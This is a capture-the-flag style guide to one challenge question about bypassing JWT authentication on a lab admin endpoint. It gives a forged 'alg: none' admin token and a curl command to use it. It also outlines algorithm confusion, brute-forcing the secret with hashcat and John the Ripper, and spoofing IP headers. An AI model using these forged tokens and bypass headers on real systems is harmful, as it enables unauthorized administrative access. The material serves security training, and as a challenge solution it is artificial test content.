# Investigation Guide: Q3 (Flag 1) - Auth Bypass

## Q3: What is the flag returned by /api/admin/flag after exploiting the auth bypass?

You have identified a JWT named `nautilus_jwt`. This is the primary target for the bypass.

### Steps to Investigate JWT Bypass:

1.  **The "None" Algorithm Attack:**
    The server might be configured to accept tokens without a signature if the header specifies `alg: none`.
    *   **Create the spoofed token:**
        *   New Header: `{"alg":"none","typ":"JWT"}` -> Base64: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
        *   New Payload: `{"username":"admin"}` -> Base64: `eyJ1c2VybmFtZSI6ImFkbWluIn0`
    *   **Final Token:** `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.` (Note the trailing dot).
    *   **Test command:**
        ```bash
        curl -H "Cookie: nautilus_jwt=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0." https://69eba7f3f6ade36f2f97629b-8000.gateway.cityinthe.cloud/api/admin/flag
        ```

2.  **Algorithm Confusion (RS256 to HS256):**
    If the server uses a public/private key pair, try to see if you can sign a token using the **Public Key** as the **HS256 Secret**. This is common in misconfigured systems.

3.  **Weak Secret Brute Force:**
    The signature `Tt532GuH...` might be signed with a simple password.
    *   Use `jwt2john` and `john the ripper` or a tool like `hashcat` to try and find the secret.
    *   If you find the secret, use a site like `jwt.io` to create a new token with `{"username":"admin"}`.

4.  **Header Spoofing (Backup):**
    If JWT manipulation doesn't work, try combining a valid `test` JWT with headers like:
    *   `X-Admin: true`
    *   `X-Forwarded-For: 127.0.0.1`
    *   `X-Custom-IP-Authorization: 127.0.0.1`
